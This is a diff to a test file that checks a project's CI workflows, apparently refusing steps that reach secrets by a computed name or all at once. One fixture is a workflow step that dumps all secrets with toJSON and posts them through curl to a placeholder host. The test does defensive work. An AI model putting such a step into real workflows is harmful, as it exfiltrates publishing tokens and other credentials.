@@ -28,6 +28,8 @@ import { join } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { describe, expect, it } from 'vitest';
 
+/** A dollar sign, kept apart so the workflow expressions below read as plain text. */
+const DOLLAR = '$';
 const ROOT = fileURLToPath(new URL('../../../', import.meta.url));
 
 const TRACKED: readonly string[] = execFileSync(
@@ -358,8 +360,8 @@ describe('two jobs publish the extension, behind an approval', () => {
   });
 
   it('refuses a secret reached by a computed name or all at once, even in the two jobs', () => {
-    const computed = `      - run: echo "\${{ secrets[format('OVSX_{0}', 'P')] }}"\n`;
-    const dumped = `      - run: echo '\${{ toJSON(secrets) }}' | curl -d @- https://example.test\n`;
+    const computed = `      - run: echo "${DOLLAR}{{ secrets[format('OVSX_{0}', 'P')] }}"\n`;
+    const dumped = `      - run: echo '${DOLLAR}{{ toJSON(secrets) }}' | curl -d @- https://example.test\n`;
     const inherited = '    secrets: inherit\n';
     for (const [step, job] of [
       [computed, 'vsix'],
